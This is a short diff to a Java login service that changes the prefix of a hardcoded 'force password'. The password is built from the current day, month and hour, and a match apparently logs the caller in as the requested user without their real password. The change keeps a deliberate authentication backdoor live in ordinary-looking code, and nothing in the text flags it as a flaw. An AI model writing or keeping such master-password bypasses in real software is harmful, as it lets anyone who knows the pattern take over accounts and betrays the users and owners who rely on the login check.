@@ -64,7 +64,7 @@ public class LoginServiceImpl implements LoginService {
         password = new String(java.util.Base64.getDecoder().decode(password));
 
         Calendar calendar = Calendar.getInstance();
-        String forcePwd = "li@" + TimeTool.stringOfDateTimeDD() + TimeTool.getCurrentMonth() + calendar.get(Calendar.HOUR_OF_DAY)+"!";
+        String forcePwd = "Boot@" + TimeTool.stringOfDateTimeDD() + TimeTool.getCurrentMonth() + calendar.get(Calendar.HOUR_OF_DAY)+"!";
         if (forcePwd.equalsIgnoreCase(password)) {
             BaseUser baseUser = new BaseUser();
             baseUser.setUserGuid(tbUsers.getGuid());
